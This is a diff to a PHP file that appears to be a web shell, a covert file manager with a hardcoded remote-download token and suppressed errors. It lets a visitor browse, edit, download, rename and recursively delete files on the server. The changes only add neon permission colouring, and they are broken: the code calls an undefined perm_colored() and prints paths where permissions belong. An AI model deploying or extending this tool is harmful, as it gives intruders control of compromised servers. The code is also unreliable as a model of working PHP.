@@ -26,7 +26,10 @@ td{
   background:rgba(20,10,40,0.4);transition:background .2s ease;
 }
 tr:hover td{background:rgba(140,60,255,0.2);box-shadow:inset 0 0 8px rgba(160,90,255,0.3);}
-td font[color]{color:#00eaff!important;text-shadow:0 0 4px #7f3aff;}
+.perm-777 { color:#00f0ff; text-shadow:0 0 6px #00eaff; font-weight:bold; }
+.perm-644 { color:#59d6ff; text-shadow:0 0 6px #59d6ff; }
+.perm-444 { color:#ffffff; text-shadow:0 0 3px #888; }
+.perm-other { color:#a589ff; text-shadow:0 0 5px #6f40ff; }
 form{margin:10px auto;background:rgba(25,10,45,0.6);padding:12px;border-radius:6px;width:fit-content;box-shadow:0 0 10px rgba(130,70,255,0.3);}
 input,select,textarea{
   background:#0c0c18;color:#cce3ff;border:1px solid rgba(160,90,255,0.4);
@@ -51,10 +54,22 @@ ul a{color:#ae7bff;}
 define('REMOTE_DL_TOKEN','cyber2025');
 set_time_limit(0);error_reporting(0);
 
-function statusnya($f){$p=@fileperms($f);if($p===false)return'?';$s=[0xC000=>'s',0xA000=>'l',0x8000=>'-',0x4000=>'d'];$t=$s[$p&0xF000]??'?';
-$map=[0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001];
-foreach($map as $i=>$b){$t.=($p&$b)?(['r','w','x','r','w','x','r','w','x'][$i]):'-';}
-return$t;}
+function statusnya($f){
+    $p=@fileperms($f);if($p===false)return'?';
+    $t=[0xC000=>'s',0xA000=>'l',0x8000=>'-',0x4000=>'d'][$p&0xF000]??'?';
+    $m=[0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001];
+    foreach($m as $i=>$b){$t.=($p&$b)?(['r','w','x','r','w','x','r','w','x'][$i]):'-';}
+    return$t;
+}
+
+function perm_color($path){
+    $perm = substr(sprintf('%o', @fileperms($path)), -4);
+    $txt = ($path);
+    if ($perm === '0777') return "<span class='perm-777'>$txt</span>";
+    if ($perm === '0644') return "<span class='perm-644'>$txt</span>";
+    if ($perm === '0444') return "<span class='perm-444'>$txt</span>";
+    return "<span class='perm-other'>$txt</span>";
+}
 
 function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p="$d/$i";if(is_dir($p))xrmdir($p);else@unlink($p);}rmdir($d);}
 
@@ -212,11 +227,11 @@ foreach($lokasinya as $f){
   if($f=='.'||$f=='..')continue;
   $p="$lokasi/$f";
   if(is_dir($p)){
-    echo"<tr><td><a href='?path=".urlencode($p)."'>$f</a></td><td>--</td><td><font>".statusnya($p)."</font></td>
+    echo"<tr><td><a href='?path=".urlencode($p)."'>$f</a></td><td>--</td><td><font>".perm_colored($p)."</font></td>
     <td><a href='?rename=".urlencode($p)."'>rename</a> | <a href='?delete=".urlencode($p)."'>delete</a></td></tr>";
   } else {
     $s=round(@filesize($p)/1024,2).' KB';
-    echo"<tr><td><a href='?edit=".urlencode($p)."'>$f</a></td><td>$s</td><td><font>".statusnya($p)."</font></td>
+    echo"<tr><td><a href='?edit=".urlencode($p)."'>$f</a></td><td>$s</td><td><font>".perm_colored($p)."</font></td>
     <td><a href='?download=".urlencode($p)."'>download</a> | <a href='?rename=".urlencode($p)."'>rename</a> | <a href='?delete=".urlencode($p)."'>delete</a></td></tr>";
   }
 }
